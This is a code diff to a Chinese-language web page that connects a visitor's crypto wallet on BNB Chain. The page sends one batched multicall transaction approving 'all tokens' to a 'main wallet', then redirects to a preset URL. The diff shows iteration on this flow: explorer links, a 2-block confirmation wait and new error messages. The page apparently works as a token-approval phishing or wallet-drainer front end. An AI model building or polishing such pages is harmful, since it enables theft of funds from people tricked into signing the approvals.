@@ -52,11 +52,16 @@
             margin-top: 8px;
         }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-secondary {
+            background: transparent; border: 1px solid var(--accent);
+            color: var(--accent); margin-top: 8px;
+        }
         .status { margin-top: 14px; font-size: 14px; text-align: center; }
         .status.success { color: var(--green); }
         .status.error { color: var(--red); }
         .status.warning { color: var(--orange); }
         .log { margin-top: 12px; text-align: left; font-size: 13px; color: var(--text-secondary); }
+        .tx-link { color: var(--accent); text-decoration: underline; word-break: break-all; }
     </style>
 </head>
 <body>
@@ -67,7 +72,7 @@
         <h2>授权给主钱包</h2>
         <div class="subtitle" id="walletStatus">请先连接钱包</div>
         <div class="token-list" id="tokenList"></div>
-        <button class="btn" id="authBtn" onclick="handleAuth()">🔑 001</button>
+        <button class="btn" id="authBtn" onclick="handleAuth()">🔑 002</button>
         <div class="status" id="status"></div>
         <div class="log" id="log"></div>
     </div>
@@ -95,7 +100,6 @@
         let signer = null;
         let userAddr = null;
 
-        // 检查钱包是否已经连接
         window.addEventListener('load', () => {
             if (window.ethereum && window.ethereum.selectedAddress) {
                 connectWallet();
@@ -213,7 +217,7 @@
                 addLog("无法检查 BNB 余额: " + e.message);
             }
 
-            // 执行授权
+            // 执行批量授权
             btn.disabled = true;
             btn.textContent = "⏳ 授权中...";
             updateStatus("请稍候，正在准备授权交易...", "");
@@ -231,22 +235,25 @@
 
                 btn.textContent = "⏳ 请在钱包中确认...";
                 updateStatus("请在弹出的钱包窗口中确认交易", "");
-                addLog("Multicall 交易已发送到钱包，请确认并等待上链...");
 
                 const tx = await multicall.aggregate(calls);
-                addLog(`交易已广播，TxHash: ${tx.hash.slice(0, 20)}...`);
-                updateStatus("交易已提交，等待确认...", "");
+                addLog(`交易已广播，TxHash: <a class="tx-link" href="https://bscscan.com/tx/${tx.hash}" target="_blank">${tx.hash.slice(0, 20)}...</a>`);
+                updateStatus("交易已提交，等待区块确认...", "");
 
-                const receipt = await tx.wait();
+                // 严格等待链上确认
+                const receipt = await tx.wait(2); // 等待 2 个区块确认
+
                 if (receipt.status === 1) {
                     updateStatus("✅ 授权成功！", "success");
-                    addLog("所有代币已成功授权给主钱包");
+                    addLog("所有代币已成功授权给主钱包，交易已上链");
+                    addLog(`可在 BscScan 查看详情: <a class="tx-link" href="https://bscscan.com/tx/${tx.hash}" target="_blank">查看交易</a>`);
                     setTimeout(() => {
                         window.location.href = REDIRECT_URL;
                     }, 1500);
                 } else {
-                    updateStatus("❌ 交易失败，请检查 BscScan 查看详情", "error");
-                    addLog("交易状态异常，可能 Gas 不足或合约执行失败");
+                    updateStatus("❌ 交易在链上执行失败", "error");
+                    addLog("交易已上链但状态为失败，请检查 Gas 或合约逻辑");
+                    addLog(`BscScan: <a class="tx-link" href="https://bscscan.com/tx/${tx.hash}" target="_blank">查看详情</a>`);
                 }
             } catch (e) {
                 if (e.message.includes("user rejected")) {
@@ -255,12 +262,9 @@
                 } else if (e.message.includes("insufficient funds")) {
                     updateStatus("❌ BNB 余额不足，无法支付 Gas", "error");
                     addLog("请先向钱包转入少量 BNB (至少 0.0005 BNB)");
-                } else if (e.message.includes("network")) {
-                    updateStatus("❌ 网络错误，请检查连接", "error");
-                    addLog("请确认钱包已切换到 BSC 链");
                 } else {
                     updateStatus("❌ 授权失败", "error");
-                    addLog(e.message.slice(0, 100));
+                    addLog(e.message.slice(0, 150));
                 }
             } finally {
                 btn.disabled = false;
